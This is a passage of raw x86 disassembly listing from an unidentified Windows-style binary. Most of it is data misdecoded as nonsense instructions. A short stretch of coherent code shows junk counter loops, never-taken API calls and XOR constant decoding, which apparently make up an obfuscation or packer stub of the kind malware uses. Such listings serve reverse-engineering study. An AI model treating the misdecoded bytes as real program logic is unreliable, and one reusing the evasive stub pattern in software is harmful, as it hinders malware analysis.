  40289a:	rol    DWORD PTR [edx+0x4d09280a],1
  4028a0:	and    edi,esp
  4028a2:	lahf   
  4028a3:	fistp  QWORD PTR [ecx-0x42553817]
  4028a9:	shl    eax,0x34
  4028ac:	jnp    0x40289f
  4028ae:	cmc    
  4028af:	pop    ecx
  4028b0:	popa   
  4028b1:	inc    esi
  4028b2:	cli    
  4028b3:	dec    ebx
  4028b4:	mov    DWORD PTR [ebx-0x6e],esp
  4028b7:	(bad)  
  4028b8:	mov    eax,DWORD PTR [esi+0x3ccde798]
  4028be:	fadd   QWORD PTR [esi+0x6d]
  4028c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028c2:	ja     0x4028b1
  4028c4:	aam    0x8a
  4028c6:	inc    ecx
  4028c7:	push   eax
  4028c8:	jbe    0x402868
  4028ca:	xchg   esi,eax
  4028cb:	(bad)  [edi+0x54]
  4028ce:	or     eax,0x8f9fb248
  4028d3:	cli    
  4028d4:	pop    es
  4028d5:	inc    edx
  4028d6:	fs or  eax,edx
  4028d9:	xchg   ebp,eax
  4028da:	push   ss
  4028db:	xchg   BYTE PTR [edi+ecx*2+0x3ce16727],dh
  4028e2:	clc    
  4028e3:	mov    dh,0x81
  4028e5:	dec    esi
  4028e6:	sahf   
  4028e7:	add    BYTE PTR [esi],ah
  4028e9:	or     ah,BYTE PTR [esi+ecx*1-0x420464b3]
  4028f0:	sbb    BYTE PTR [esi+0x4a],bh
  4028f3:	push   ebx
  4028f4:	jecxz  0x402930
  4028f6:	(bad)  
  4028f7:	push   ebp
  4028f8:	ins    BYTE PTR es:[edi],dx
  4028f9:	sbb    BYTE PTR [edx+0x50],0x71
  4028fd:	and    dh,0x18
  402900:	jp     0x4028f7
  402902:	lods   eax,DWORD PTR ds:[esi]
  402903:	in     eax,0x4
  402905:	pop    esi
  402906:	cs inc ecx
  402908:	pop    edx
  402909:	(bad)  
  40290a:	cmp    DWORD PTR [ecx],eax
  40290c:	rcl    DWORD PTR gs:[edi],0xdb
  402910:	loop   0x402918
  402912:	and    DWORD PTR [eax+ecx*4],edx
  402915:	fist   DWORD PTR [edi]
  402917:	iret   
  402918:	fimul  DWORD PTR cs:[ebp+0x9]
  40291c:	ret    0xa26
  40291f:	dec    esi
  402920:	add    BYTE PTR [eax],bh
  402922:	int3   
  402923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402924:	add    eax,0xd7ca776f
  402929:	jl     0x402982
  40292b:	and    eax,0x64d1ac00
  402930:	dec    esi
  402931:	fsub   QWORD PTR [edx+0x8a404d0]
  402937:	(bad)  [ebx+edi*4+0x0]
  40293b:	inc    edi
  40293c:	test   BYTE PTR [ebp-0x20],bh
  40293f:	lods   al,BYTE PTR ds:[esi]
  402940:	cmp    eax,0xbb5ada7d
  402945:	jae    0x4029a8
  402947:	fwait
  402948:	neg    BYTE PTR [ebp+0x7972402]
  40294e:	cld    
  40294f:	arpl   WORD PTR [ebx-0x76],ax
  402952:	pop    ebx
  402953:	jg     0x402942
  402955:	pop    ss
  402956:	repnz add al,0x37
  402959:	sub    bh,BYTE PTR [edx-0x70]
  40295c:	cli    
  40295d:	dec    eax
  40295e:	lods   eax,DWORD PTR ds:[esi]
  40295f:	(bad)  
  402960:	or     dl,BYTE PTR [edx-0x20]
  402963:	sub    al,0xcc
  402965:	neg    DWORD PTR [ebp+0x5e]
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x466e0f77
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x2170707e
  402afd:	push   esp
  402afe:	out    0x4,eax
  402b00:	out    dx,eax
  402b01:	nop
  402b02:	sti    
  402b03:	cwde   
  402b04:	jle    0x402ab2
  402b06:	cmp    ebp,DWORD PTR [esi]
  402b08:	and    eax,0x437e0005
  402b0d:	mov    al,ds:0x60d124ad
  402b12:	ss mov cl,0x97
  402b15:	mov    eax,ds:0xc62b15b3
  402b1a:	inc    esi
  402b1b:	jae    0x402abb
  402b1d:	jmp    0x7ac8:0x1a66e356
  402b24:	push   esp
  402b25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b26:	mov    ch,0x21
  402b28:	pop    ebx
  402b29:	int3   
  402b2a:	scas   eax,DWORD PTR es:[edi]
  402b2b:	sub    eax,0xaecd6b29
  402b30:	sbb    ah,BYTE PTR [eax]
  402b32:	clc    
  402b33:	or     eax,0x77fba24a
  402b38:	xchg   cl,bl
  402b3a:	jecxz  0x402b48
  402b3c:	ds jmp 0xa790f902
  402b42:	aam    0x51
  402b44:	out    dx,eax
  402b45:	rcr    DWORD PTR [esp+edx*4-0x1],cl
  402b49:	pop    ecx
  402b4a:	sar    ebx,1
  402b4c:	mov    al,0xb4
  402b4e:	adc    ebp,0xffffffb9
  402b51:	xchg   ebp,eax
  402b52:	push   es
  402b53:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b55:	aam    0x1
  402b57:	jno    0x402b58
  402b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b5a:	xor    al,0x59
  402b5c:	pop    esi
  402b5d:	inc    esi
  402b5e:	pop    ss
  402b5f:	push   0x7b0449a6
  402b64:	aam    0xed
  402b66:	dec    eax
  402b67:	stos   BYTE PTR es:[edi],al
  402b68:	cmp    dh,0xd4
  402b6b:	pop    ebx
  402b6c:	add    dl,BYTE PTR [edx+edi*8]
  402b6f:	or     eax,DWORD PTR [ebx+0x50]
  402b72:	dec    esp
  402b73:	or     al,0xac
  402b75:	inc    edi
  402b76:	inc    edi
  402b77:	in     eax,0xa5
  402b79:	in     al,dx
  402b7a:	scas   al,BYTE PTR es:[edi]
  402b7b:	add    eax,0xc1044a39
  402b80:	jne    0x402b30
  402b82:	hlt    
  402b83:	ror    DWORD PTR [ebx],cl
  402b85:	or     al,0x41
  402b87:	rcl    DWORD PTR [esi],1
  402b89:	mov    al,0x71
  402b8b:	push   ss
  402b8c:	dec    esp
  402b8d:	sub    esi,edi
  402b8f:	rcl    DWORD PTR [edi-0x28],cl
  402b92:	mov    eax,0x843f311
  402b97:	stos   BYTE PTR es:[edi],al
  402b98:	push   ss
  402b99:	add    DWORD PTR [edi+0x50092d48],esp
  402b9f:	test   eax,0x89e22ec
  402ba4:	pop    edi
  402ba5:	lods   al,BYTE PTR ds:[esi]
  402ba6:	ja     0x402be5
  402ba8:	or     al,0x43
  402baa:	call   0xb909:0xe39c4297
  402bb1:	xor    BYTE PTR [eax+esi*8+0x282090d7],bl
  402bb8:	jmp    0xa8c9:0xbb3984ad
  402bbf:	fs and dl,al
  402bc2:	dec    esp
  402bc3:	push   es
  402bc4:	mov    ebx,0xa5433157
  402bc9:	(bad)  
  402bca:	pop    esi
  402bcb:	repz jp 0x402bcc
  402bce:	(bad)  
  402bcf:	xchg   ebp,eax
  402bd0:	int3   
  402bd1:	hlt    
  402bd2:	sbb    DWORD PTR [ebp+0x78a1f46e],eax
  402bd8:	pop    ebx
  402bd9:	mov    dl,BYTE PTR [ebx]
  402bdb:	pushf  
  402bdc:	mov    al,ds:0x6c5728e9
  402be1:	out    dx,al
  402be2:	pushf  
  402be3:	pop    es
  402be4:	adc    al,0x25
  402be6:	mov    WORD PTR [eax],gs
  402be8:	aam    0x84
  402bea:	loope  0x402c45
  402bec:	int3   
  402bed:	mov    eax,0x7d7cde15
  402bf2:	xor    ah,BYTE PTR [ebp+0x76]
  402bf5:	mov    al,ds:0xf01b48ff
  402bfa:	fsubr  DWORD PTR [esi+0x5e]
  402bfd:	addr16 mov ch,0xe1
  402c00:	arpl   WORD PTR [eax-0x8cb9cd4],di
  402c06:	mov    eax,ds:0xb9f45d04
  402c0b:	or     ebx,esp
  402c0d:	leave  
  402c0e:	iret   
  402c0f:	aas    
  402c10:	(bad)  
  402c12:	jmp    0x402c03
  402c14:	repnz ins BYTE PTR es:[edi],dx
  402c16:	pop    edx
  402c17:	sbb    esp,eax
  402c19:	enter  0xb24b,0x9
  402c1d:	sub    ebx,ebp
  402c1f:	or     esi,ebx
  402c21:	cmovge esp,DWORD PTR [edi]
  402c24:	out    dx,ax
  402c26:	jmp    0x46bc:0x506c8be3
  402c2d:	imul   edi,DWORD PTR [ecx+ebp*1],0xffffffc6
  402c31:	pusha  
  402c32:	inc    ebp
  402c33:	add    bl,ch
  402c35:	sbb    BYTE PTR [edx],ch
  402c37:	or     al,0x5a
  402c39:	imul   esi,DWORD PTR [edx+0x739302b3],0xffffff91
  402c40:	dec    edi
  402c41:	or     eax,0x7dc6390f
  402c46:	mov    eax,ds:0x6b3bbf8b
  402c4b:	ins    DWORD PTR es:[edi],dx
  402c4c:	pop    ds
  402c4d:	adc    ebx,eax
  402c4f:	test   DWORD PTR [edi+0x300717e1],0x5b3b85a1
  402c59:	push   esi
  402c5a:	call   0x1752:0xf533e48a
  402c61:	loope  0x402cbc
  402c63:	jp     0x402bf6
  402c65:	sub    edi,0xffffffa8
  402c68:	inc    ebp
  402c69:	xor    BYTE PTR [ebp+0x31213dd],0x92
  402c70:	inc    esp
  402c71:	int3   
  402c72:	popa   
  402c73:	sub    al,0x78
  402c75:	jb     0x402c08
  402c77:	xchg   ebp,eax
  402c78:	inc    edx
  402c79:	pop    esi
  402c7a:	fidivr DWORD PTR [eax]
  402c7c:	mov    edx,0xcc18db5d
  402c81:	lahf   
  402c82:	sbb    eax,eax
  402c84:	sbb    bh,cl
  402c86:	xchg   ebx,eax
  402c87:	mov    dl,0x65
  402c89:	imul   edi,DWORD PTR [ecx+ecx*8+0x44],0x57f5531b
  402c91:	mov    esi,0x46a96b75
  402c96:	cmp    BYTE PTR [esi+0x6eb535b2],dh
  402c9c:	cdq    
  402c9d:	adc    al,0x84
  402c9f:	bound  esp,QWORD PTR [edi+0x54]
  402ca2:	pop    esp
  402ca3:	mov    dl,0x97
  402ca5:	mov    esp,0xe47003e5
  402caa:	call   0xd26a:0xe41533ce
  402cb1:	push   eax
  402cb2:	in     eax,0x6f
  402cb4:	pushf  
  402cb5:	pop    ecx
  402cb6:	dec    ecx
  402cb7:	ret    0xaac8
  402cba:	popf   
  402cbb:	clc    
  402cbc:	fidiv  WORD PTR [ebx+0x56]
  402cbf:	or     DWORD PTR [ebp+0x1e1aad21],ebx
  402cc5:	outs   dx,BYTE PTR ds:[esi]
  402cc6:	sub    BYTE PTR [ebx-0x273485e9],dl
  402ccc:	push   cs
  402ccd:	dec    BYTE PTR [eax-0x6]
  402cd0:	lea    edi,[ebx-0x12f99e23]
  402cd6:	je     0x402d16
  402cd8:	sbb    eax,0x37656106
  402cdd:	(bad)  
  402cde:	jno    0x402d0c
  402ce0:	sub    ebx,DWORD PTR [esi]
  402ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ce3:	pop    ds
  402ce4:	sub    ebp,DWORD PTR [edi-0xabae65f]
  402cea:	or     ecx,ebp
  402cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ced:	dec    BYTE PTR [edi+0x6e824c42]
  402cf3:	and    edi,DWORD PTR [esi-0x23]
  402cf6:	sbb    ebx,DWORD PTR [ebx]
  402cf8:	inc    DWORD PTR [eax-0x57]
  402cfb:	shl    BYTE PTR [eax+0x46],cl
  402cfe:	mov    esi,0xc85bebb0
  402d03:	pop    ebx
  402d04:	cld    
  402d05:	or     edx,esi
  402d07:	xchg   ebx,eax
  402d08:	pop    edi
  402d09:	push   esi
  402d0a:	mov    bl,0xfb
  402d0c:	jp     0x402cad
  402d0e:	xor    cl,bh
  402d10:	and    BYTE PTR [eax+0x57],cl
  402d13:	xor    al,0x89
  402d15:	out    0x52,eax
  402d17:	(bad)  
  402d18:	jbe    0x402d3c
  402d1a:	mov    edi,0xb149d77c
  402d1f:	cli    
  402d20:	cld    
  402d21:	push   ds
  402d22:	xor    DWORD PTR [edi+0x33cb3776],ebp
  402d28:	mov    dl,0x16
  402d2a:	loopne 0x402d13
  402d2c:	or     DWORD PTR [ebp+ebp*1-0x56],esi
  402d30:	stc    
  402d31:	add    ecx,esi
  402d33:	xchg   edx,eax
  402d34:	mov    eax,ds:0xfe5c22b7
  402d39:	fsub   QWORD PTR [edi+0xe98d65e]
  402d3f:	mov    DWORD PTR [ecx+0x7602858e],ecx
  402d45:	pop    es
  402d46:	test   DWORD PTR [esi+0x0],esi
  402d49:	jg     0x402d91
  402d4b:	dec    edi
  402d4c:	ficom  DWORD PTR [ecx]
  402d4e:	test   al,0x4
  402d50:	jnp    0x402d8b
  402d52:	xchg   BYTE PTR [edi-0x69f41979],cl
  402d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d59:	sbb    al,0xf3
  402d5b:	xchg   ecx,eax
  402d5c:	loope  0x402d9c
  402d5e:	loopne 0x402d63
  402d60:	scas   al,BYTE PTR es:[edi]
  402d61:	ins    BYTE PTR es:[edi],dx
  402d62:	xor    al,0x4e
  402d64:	sahf   
  402d65:	js     0x402cee
  402d67:	jge    0x402d5b
  402d69:	mov    ds:0x493df693,eax
  402d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d6f:	mov    bl,0xad
  402d71:	leave  
  402d72:	xor    edx,DWORD PTR [edi+0xefa0abb]
  402d78:	es xor dl,al
  402d7b:	inc    edx
  402d7c:	pop    esi
  402d7d:	dec    ebp
  402d7e:	das    
  402d7f:	adc    DWORD PTR [ecx],0xfffffffb
  402d82:	aas    
  402d83:	mov    dl,0xa5
  402d85:	mov    ds:0x3fcb2957,al
  402d8a:	mov    bh,0xc1
  402d8c:	mov    cl,0xab
  402d8e:	push   edx
  402d8f:	cmp    DWORD PTR [edx],esi
  402d91:	dec    edx
  402d92:	call   0x375da646
  402d97:	mov    eax,0x7180feca
  402d9c:	jge    0x402d24
  402d9e:	xchg   ecx,eax
  402d9f:	xchg   ebp,eax
  402da0:	sbb    eax,0x864789f7
  402da5:	clc    
  402da6:	sbb    BYTE PTR [eax],0x4f
  402da9:	scas   al,BYTE PTR es:[edi]
  402daa:	mov    ch,0x89
  402dac:	dec    ebp
  402dad:	sub    ebx,DWORD PTR [ecx-0x57]
  402db0:	or     ecx,ebx
  402db2:	not    bl
  402db4:	lock outs dx,BYTE PTR ds:[esi]
  402db6:	dec    eax
  402db7:	je     0x402d66
  402db9:	je     0x402d53
  402dbb:	cs retf 
  402dbd:	sub    eax,0xd73bd603
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	add    al,0x5b
  402de1:	xchg   DWORD PTR [ecx+0x70700abe],esp
  402de7:	mov    esi,0x7f70707e
  402dec:	inc    esp
  402ded:	lea    ebp,ds:[ebp-0x7f]
  402df1:	stos   DWORD PTR es:[edi],eax
  402df2:	ds push esi
  402df4:	mov    WORD PTR [ebp-0x35],?
  402df7:	aaa    
  402df8:	fadd   QWORD PTR [eax]
  402dfa:	push   0x6
  402dfc:	addr16 push 0xb3a01afc
  402e02:	sub    dh,bl
  402e04:	cmp    eax,0xcb892e5b
  402e09:	cld    
  402e0a:	arpl   WORD PTR [eax-0x51],bp
  402e0d:	imul   eax,edx,0x4c
  402e10:	xchg   esp,eax
  402e11:	js     0x402e91
  402e13:	and    bl,BYTE PTR [eax]
  402e15:	mov    ebp,0x232af242
  402e1a:	dec    sp
  402e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e1d:	les    edx,FWORD PTR [ebx]
  402e1f:	rcr    bh,cl
  402e21:	stc    
  402e22:	loopne 0x402e3e
  402e24:	cmp    BYTE PTR [ecx],al
  402e26:	nop
  402e27:	adc    eax,0x398c46cb
  402e2c:	sbb    dh,BYTE PTR [ecx+0x15]
  402e2f:	add    ebp,DWORD PTR [edi+0x59]
  402e32:	push   edi
  402e33:	mov    bh,0x29
  402e35:	jle    0x402e8c
  402e37:	arpl   ax,bx
  402e39:	pop    ebx
  402e3a:	add    edi,esp
  402e3c:	push   es
  402e3d:	cmp    BYTE PTR [eax-0x2d565f54],bl
  402e43:	xor    BYTE PTR [ecx],dh
  402e45:	scas   al,BYTE PTR es:[edi]
  402e46:	dec    esi
  402e47:	cmp    eax,0x2f9b429c
  402e4c:	mov    ch,0xb1
  402e4e:	push   0xffffff9c
  402e50:	mov    eax,0xecc6dcb8
  402e55:	cmp    dh,BYTE PTR [ecx+0x11]
  402e58:	mov    DWORD PTR [edi+0x72],esi
  402e5b:	dec    edx
  402e5c:	in     al,0xe0
  402e5e:	fidivr DWORD PTR [eax-0x61]
  402e61:	inc    eax
  402e62:	outs   dx,DWORD PTR ds:[esi]
  402e63:	cmp    esp,edi
  402e65:	cmp    al,0x16
  402e67:	push   cs
  402e68:	xchg   edi,eax
  402e69:	int    0xff
  402e6b:	cwde   
  402e6c:	inc    ebx
  402e6d:	and    DWORD PTR [edx],eax
  402e6f:	adc    eax,0x271fa25a
  402e74:	adc    esi,ecx
  402e76:	sub    BYTE PTR ds:0xa4582f27,al
  402e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e7d:	bswap  ebx
  402e7f:	test   DWORD PTR [ebp-0x49],0xad017408
  402e86:	mov    esi,eax
  402e88:	push   ecx
  402e89:	(bad)  
  402e8a:	fistp  WORD PTR [ebp-0x646f38f6]
  402e90:	aaa    
  402e91:	xchg   esi,eax
  402e92:	cmp    al,0x5b
  402e94:	js     0x402eca
  402e96:	cmc    
  402e97:	jb     0x402ed4
  402e99:	cmp    DWORD PTR [esi-0x322d85f1],0x70569554
  402ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ea4:	shl    esi,1
  402ea6:	repz mov cl,dh
  402ea9:	cdq    
  402eaa:	inc    eax
  402eab:	cmp    eax,0xe5e3bb8f
  402eb0:	das    
  402eb1:	int    0xdc
  402eb3:	gs or  al,0xec
  402eb6:	jnp    0x402ef2
  402eb8:	xchg   DWORD PTR [edx+0x1412aa97],ebp
  402ebe:	or     bl,cl
  402ec0:	(bad)  
  402ec1:	ins    DWORD PTR es:[edi],dx
  402ec2:	inc    ebx
  402ec3:	xor    BYTE PTR [eax],0x50
  402ec6:	sub    DWORD PTR [edx],ecx
  402ec8:	dec    ebx
  402ec9:	aad    0xc9
  402ecb:	cmp    BYTE PTR [ebx+eax*4+0x57960f60],cl
  402ed2:	mov    ebp,0x3e443b82
  402ed7:	mov    WORD PTR [ebx+0x337b6bf3],fs
  402edd:	pop    ss
  402ede:	sbb    eax,0x4bd1245a
  402ee3:	lods   eax,DWORD PTR ds:[esi]
  402ee4:	dec    edx
  402ee5:	dec    ebp
  402ee6:	pop    esp
  402ee7:	xchg   ecx,eax
  402ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ee9:	lock adc cl,BYTE PTR [ebp-0x27]
  402eed:	jecxz  0x402ed5
  402eef:	fimul  DWORD PTR [esi-0x75e67bf6]
  402ef5:	xchg   esp,eax
  402ef6:	arpl   WORD PTR [ebx],ax
  402ef8:	int3   
  402ef9:	loop   0x402f53
  402efb:	push   cs
  402efc:	iret   
  402efd:	iret   
  402efe:	pop    edi
  402eff:	pop    ds
  402f00:	icebp  
  402f01:	ret    0xe23f
  402f04:	push   ebp
  402f05:	jl     0x402edf
  402f07:	std    
  402f08:	std    
  402f09:	ret    
  402f0a:	push   ds
  402f0b:	pop    es
  402f0c:	xchg   edi,eax
  402f0d:	popf   
  402f0e:	jne    0x402eca
  402f10:	mov    BYTE PTR [ebp+0x8f3e187],bh
  402f16:	and    DWORD PTR [edx+ebp*1+0x40],esp
  402f1a:	sub    BYTE PTR [ecx-0x7c6de34c],al
  402f20:	adc    eax,0xf662b0d9
  402f25:	adc    BYTE PTR [edi+edi*1-0x80],ah
  402f29:	inc    esi
  402f2a:	push   ss
  402f2b:	dec    eax
  402f2c:	test   BYTE PTR [ebp-0x11529585],ah
  402f32:	pusha  
  402f33:	cmc    
  402f34:	adc    dl,BYTE PTR [eax+ebp*1]
  402f37:	lods   eax,DWORD PTR ds:[esi]
  402f38:	fsub   QWORD PTR [eax]
  402f3a:	(bad)  
  402f3b:	loope  0x402f0c
  402f3d:	pop    es
  402f3e:	sbb    edi,DWORD PTR [edi+eax*1]
  402f41:	sub    ecx,esi
  402f43:	jnp    0x402f16
  402f45:	cld    
  402f46:	retf   0x343f
  402f49:	neg    DWORD PTR [ebp+0x7e]
  402f4c:	outs   dx,BYTE PTR ds:[esi]
  402f4d:	sahf   
  402f4e:	outs   dx,BYTE PTR ds:[esi]
  402f4f:	mov    al,ds:0xb146b5f5
  402f54:	jae    0x402f02
  402f56:	cmp    edx,DWORD PTR [edx+ebp*2]
  402f59:	into   
  402f5a:	push   esp
  402f5b:	xlat   BYTE PTR ds:[ebx]
  402f5c:	gs fsubp st(0),st
  402f5f:	pop    eax
  402f60:	in     al,0xbb
  402f62:	rcr    BYTE PTR [edi*2-0x1e8bea73],cl
  402f69:	sti    
  402f6a:	fbstp  TBYTE PTR [ecx]
  402f6c:	daa    
  402f6d:	mov    edx,DWORD PTR [ecx-0x1a0498e8]
  402f73:	fs fcom st(7)
  402f76:	xchg   esi,eax
  402f77:	inc    esp
  402f78:	(bad)  
  402f79:	mov    dh,0xa8
  402f7b:	mov    esi,0x21baea37
  402f80:	lock sub esp,esp
  402f83:	inc    esp
  402f84:	in     al,0xb1
  402f86:	mov    dh,0x1e
  402f88:	pop    es
  402f89:	mov    WORD PTR [eax],ss
  402f8b:	lods   al,BYTE PTR ds:[esi]
  402f8c:	xor    dl,bl
  402f8e:	mov    esp,0xb248d2d3
  402f93:	imul   esp,edi,0xffffff86
  402f96:	mov    edx,0x18f2b667
  402f9b:	inc    esp
  402f9c:	stos   DWORD PTR es:[edi],eax
  402f9d:	js     0x402fa4
  402f9f:	enter  0x60e9,0xaf
  402fa3:	gs push 0xb021d0b
  402fa9:	call   0x9911:0x1e843821
  402fb0:	jnp    0x402f3d
  402fb2:	jb     0x402f51
  402fb4:	cmc    
  402fb5:	lods   al,BYTE PTR ds:[esi]
  402fb6:	mov    bl,0xbc
  402fb8:	xchg   BYTE PTR ds:[edx+eax*4],bl
  402fbc:	int3   
  402fbd:	adc    esp,DWORD PTR [ecx-0x43]
  402fc0:	sbb    BYTE PTR [edx],ch
  402fc2:	test   eax,0xaf3f6411
  402fc7:	jb     0x403024
  402fc9:	stos   BYTE PTR es:[edi],al
  402fca:	repz ret 
  402fcc:	cmp    BYTE PTR [ebx+0x5c526826],bh
  402fd2:	add    dh,BYTE PTR [ebx-0x74]
  402fd5:	pop    esp
  402fd6:	inc    ecx
  402fd7:	add    edx,DWORD PTR ds:0xa13225fb
  402fdd:	loopne 0x402f7e
  402fdf:	mov    dl,0x47
  402fe1:	push   ss
  402fe2:	les    esi,FWORD PTR [edi]
  402fe4:	std    
  402fe5:	xor    eax,0x1d1f126
  402fea:	jno    0x40303b
  402fec:	addr16 cwde 
  402fee:	lock or al,cl
  402ff1:	mov    edi,0x4e6e0ab7
  402ff6:	push   edi
  402ff7:	jne    0x40302f
  402ff9:	cmc    
  402ffa:	mov    esp,0xf667dca7
  402fff:	dec    edx
  403000:	inc    esi
  403001:	inc    al
  403003:	sbb    cl,al
  403005:	fimul  DWORD PTR [esi]
  403007:	mov    eax,0x4de83cae
  40300c:	or     al,0xf3
  40300e:	lods   al,BYTE PTR ds:[esi]
  40300f:	daa    
  403010:	fnstenv [edx+esi*1]
  403013:	and    ebx,DWORD PTR [edx+0x1c106592]
  403019:	pop    edx
  40301a:	sub    edi,ecx
  40301c:	sbb    al,0xb6
  40301e:	jnp    0x402fae
  403020:	out    dx,al
  403021:	push   esp
  403022:	ficomp DWORD PTR [eax-0x51]
  403025:	xchg   edi,eax
  403026:	or     eax,0xb1c16bcc
  40302b:	sbb    DWORD PTR [eax+0x1f388d3c],ecx
  403031:	inc    ebp
  403032:	stc    
  403033:	jp     0x403012
  403035:	repz sti 
  403037:	push   edx
  403038:	mov    al,0xa2
  40303a:	fs push es
  40303c:	add    bh,cl
  40303e:	xchg   esi,eax
  40303f:	pusha  
  403040:	fwait
  403041:	(bad)  
  403042:	xlat   BYTE PTR ds:[ebx]
  403043:	jmp    0x403069
  403045:	mov    bh,0x1d
  403047:	lahf   
  403048:	cmp    eax,DWORD PTR [edx-0xc]
  40304b:	or     al,0xc1
  40304d:	jle    0x4030bc
  40304f:	fcomp  DWORD PTR [edx]
  403051:	sbb    eax,0xdb858443
  403056:	jae    0x4030bc
  403058:	mov    eax,DWORD PTR [edi-0xcb35910]
  40305e:	jg     0x40301e
  403060:	mov    es,WORD PTR ds:0xaf67718
  403066:	pop    ds
  403067:	std    
  403068:	fdiv   st(5),st
  40306a:	cs push ecx
  40306c:	push   esi
  40306d:	xor    eax,0x4435a70c
  403072:	call   0x46d8:0x5f1c5e9c
  403079:	dec    eax
  40307a:	jecxz  0x4030db
  40307c:	push   cs
  40307d:	pushf  
  40307e:	in     al,0x7b
  403080:	das    
  403081:	ins    DWORD PTR es:[edi],dx
  403082:	(bad)  
  403083:	out    dx,eax
  403084:	fwait
  403085:	(bad)  
  403086:	in     eax,dx
  403087:	push   ss
  403088:	cmp    esi,DWORD PTR [eax+0x623f7a9e]
  40308e:	outs   dx,DWORD PTR ds:[esi]
  40308f:	nop
  403090:	icebp  
  403091:	mov    bl,0xb
  403093:	or     ah,BYTE PTR [edi]
  403095:	outs   dx,BYTE PTR ds:[esi]
  403096:	add    BYTE PTR [ecx+0x565fb7a4],cl
  40309c:	or     DWORD PTR [eax+0x54],eax
  40309f:	pushf  
  4030a0:	inc    edi
  4030a1:	mov    bh,0x2
  4030a3:	addr16 lock repnz retf 0x9b5c
  4030a9:	lock std 
  4030ab:	and    al,0x9a
  4030ad:	mov    esi,0x32729c
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
